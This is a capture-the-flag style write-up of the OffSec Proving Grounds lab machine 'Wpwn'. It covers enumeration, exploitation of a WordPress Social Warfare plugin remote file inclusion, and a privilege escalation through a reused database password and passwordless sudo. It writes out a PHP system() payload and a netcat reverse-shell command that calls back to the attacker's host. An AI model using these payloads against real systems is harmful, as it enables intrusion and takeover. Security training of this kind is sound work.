---
title: OffSec PG - Wpwn
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.80.123`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.123`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                 |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.80.123 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

Directories/files listed &rarr;

- index.html
- wordpress/

Running gobuster again for the wordpress directory gives additional results &rarr;

- index.php
- wp-content/
- wp-login.php
- wp-includes/
- readme.html
- license.txt
- wp-trackback.php
- wp-admin/
- xmlrpc.php
- wp-signup.php

The folders indicates that an instance of wordpress is running on the web server. Running wpscan on the webserver using the docker image by `docker run -it --rm wpscanteam/wpscan --url http://192.168.80.123/wordpress/` gives the following info &rarr;

- Directory listing enabled at `/wordpress/wp-content/uploads/`
- WP-Cron enabled at `/wordpress/wp-cron.php`
- Wordpress version 5.5 using generator tag at `/wordpress/index.php/feed/`
- Wordpress theme version 1.5 (latest is 1.8)
- User `admin` identified at `/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1`
- Outdated plugin Social Warfare 3.5.2 (latest is 4.3) identified at `/wordpress/wp-content/plugins/social-warfare/readme.txt`

---

## Exploitation

### RFI and RCE

Using searchsploit to search for social warfare gives the result as an RCE for versions < 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in `/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=<RFI_URL>`.

### Reverse shell

Visiting this page would give the result of the command in the payload url. The payload must be of the form &rarr;

`<pre>system('whoami')</pre>`. Checking the existence of netcat and bash, a new payload can be used for a reverse shell &rarr; `nc -e /bin/bash 192.168.49.80 3002`. This grants the user flag.

---

## Privilege Escalation

### User

The users discovered from the reverse shell as `www-data` are `root` and `takis`. Looking through the config of wordpress in `wp-config.php`, a DB_password is found. This could be used for the `takis` user on ssh. This works and a user shell is obtained.

### Root

The `takis` user is able to run sudo without a password for all commands. Therefore `sudo su` grants the root shell as well as the root flag.

---
